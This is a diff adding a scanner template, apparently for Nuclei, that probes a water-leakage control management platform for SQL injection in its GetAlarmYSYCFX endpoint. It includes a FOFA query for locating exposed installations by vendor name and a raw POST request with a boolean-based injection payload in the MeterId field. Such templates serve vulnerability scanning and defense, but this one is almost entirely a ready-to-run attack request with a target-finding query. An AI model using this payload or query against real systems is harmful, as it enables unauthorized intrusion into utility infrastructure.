@@ -1,0 +1,27 @@
+id: poc-lvolu6u21sdhbrvg
+info:
+  name: 漏损控制管理平台存在GetAlarmYSYCFX  存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lvolu6u21sdhbrvg'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lvolu6u21sdhbrvg
+    fofa: body="上海肯特仪表" && body="登陆管理平台"
+http:
+- raw:
+  - 'POST /App/GetAlarmYSYCFX HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/json
+
+    Content-Length: 58
+
+    {"MeterId":"1'' AND 84=85 AND ''Lhsd''=''Lhsd","AlarmTypeID":20}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
